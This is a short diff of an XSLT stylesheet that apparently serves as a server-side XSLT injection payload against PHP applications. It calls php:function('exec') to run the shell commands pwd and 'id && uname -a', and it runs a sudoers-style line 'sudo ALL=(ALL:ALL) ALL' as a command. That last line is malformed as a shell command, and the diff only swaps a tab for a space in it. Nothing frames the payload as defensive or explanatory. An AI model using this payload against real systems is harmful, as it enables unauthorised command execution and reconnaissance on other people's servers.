@@ -3,6 +3,6 @@
 <xsl:template match="/">
 <xsl:value-of select="php:function('exec','pwd')"/>
 <xsl:value-of select="php:function('exec','id &amp;&amp; uname -a')"/>
-<xsl:value-of select="php:function('exec','sudo	ALL=(ALL:ALL) ALL')"/>
+<xsl:value-of select="php:function('exec','sudo ALL=(ALL:ALL) ALL')"/>
 </xsl:template>
 </xsl:stylesheet>
